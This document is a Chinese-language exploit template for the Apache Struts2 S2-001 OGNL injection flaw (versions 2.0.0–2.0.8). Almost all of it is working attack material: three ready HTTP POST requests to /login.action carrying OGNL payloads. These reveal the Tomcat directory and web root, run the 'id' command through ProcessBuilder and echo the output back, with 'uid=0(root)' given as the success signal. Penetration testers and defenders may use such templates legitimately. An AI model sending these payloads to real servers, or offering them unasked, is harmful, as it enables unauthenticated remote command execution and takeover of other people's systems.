# S2-001 OGNL 注入 RCE

## 指纹特征
- 服务: Apache Struts2 (2.0.0 - 2.0.8)
- 协议: HTTP (OGNL 表达式解析)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 表单验证失败后的 OGNL 解析 | 登录/注册页表单提交 | 无 |

## PoC 指令

通过提交包含 `%{...}` 的 OGNL 表达式触发解析：

**1. 获取 Tomcat 路径**
```http
POST /login.action HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: application/x-www-form-urlencoded

username=%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}&password=1
```

**2. 获取 Web 物理路径**
```http
POST /login.action HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: application/x-www-form-urlencoded

username=%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}&password=1
```

**3. 执行命令**
```http
POST /login.action HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: application/x-www-form-urlencoded

username=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}&password=1
```

## Success Signal
- **状态验证**: 页面回显命令执行结果 (如 `uid=0(root)`)。
